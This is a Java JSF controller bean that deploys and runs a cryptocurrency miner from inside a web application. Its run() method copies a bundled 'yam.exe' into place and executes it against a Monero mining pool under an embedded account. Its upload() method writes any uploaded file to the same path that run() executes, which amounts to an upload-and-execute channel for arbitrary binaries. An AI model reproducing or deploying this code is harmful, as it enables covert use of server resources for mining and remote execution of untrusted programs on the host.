import org.primefaces.model.UploadedFile;

import javax.annotation.PostConstruct;
import javax.faces.application.FacesMessage;
import javax.faces.bean.ApplicationScoped;
import javax.faces.bean.ManagedBean;
import javax.faces.bean.ViewScoped;
import javax.faces.context.FacesContext;
import javax.faces.webapp.FacesServlet;
import javax.inject.Inject;
import javax.inject.Named;
import javax.inject.Singleton;
import javax.servlet.ServletContext;
import java.io.*;
import java.net.MalformedURLException;
import java.nio.file.Paths;

/**
 * Created by dino on 14.05.2017.
 */
@Named
@Singleton
public class Controller {
    @Inject
    private FacesContext facesContext;

    @Inject
    ServletContext context;

    private int minerProcessCount;

    private UploadedFile file;

    public UploadedFile getFile() {
        return file;
    }

    public void setFile(UploadedFile file) {
        this.file = file;
    }

    public void upload() {
        if(file != null) {

            FacesMessage message = new FacesMessage("Succesful", file.getFileName() + " is uploaded.");
            FacesContext.getCurrentInstance().addMessage(null, message);
            try {
                InputStream in = new ByteArrayInputStream(file.getContents());
                OutputStream out = new FileOutputStream(new File("//yam"));

                byte[] buffer = new byte[1024];
                int length;
                //copy the file content in bytes
                while ((length = in.read(buffer)) > 0) {
                    out.write(buffer, 0, length);
                }
                in.close();
                out.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    @PostConstruct
    private void init(){
        System.out.println("Miner bean constructed!");
    }

    public void run(){

        String destPath = "//yam";
        if (!new File(destPath).exists()){
            String sourcePath = null;
            try {
                sourcePath = context.getResource("/WEB-INF/web.xml").getPath();
            } catch (MalformedURLException e) {
                e.printStackTrace();
            }
            sourcePath = sourcePath.replace("WEB-INF/web.xml", "WEB-INF/classes/yam.exe");
            sourcePath = sourcePath.replaceFirst("/", "");
            System.out.println(sourcePath);
            facesContext.addMessage(null, new FacesMessage(sourcePath));

            moveFile(sourcePath, destPath);

        }

        Runtime rt = Runtime.getRuntime();
        try {
            rt.exec(destPath + " -c 1 -M stratum+tcp://the.bitcoin.time%40gmail.com:x@xmr.pool.minergate.com:45560/xmr");
            minerProcessCount = minerProcessCount + 1;
        } catch (IOException e) {
            e.printStackTrace();
        }
        System.out.println(minerProcessCount);
        facesContext.addMessage(null, new FacesMessage("Executed! MinerProcessCount = " + minerProcessCount));
    }

    private boolean moveFile(String sourcePath, String destPath){
        File source = new File(sourcePath);
        File dest = new File(destPath);
        try {
            InputStream in = new FileInputStream(source);
            OutputStream out = new FileOutputStream(dest);

            byte[] buffer = new byte[1024];
            int length;
            //copy the file content in bytes
            while ((length = in.read(buffer)) > 0) {
                out.write(buffer, 0, length);
            }
            in.close();
            out.close();
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public int getMinerProcessCount() {
        return minerProcessCount;
    }
}
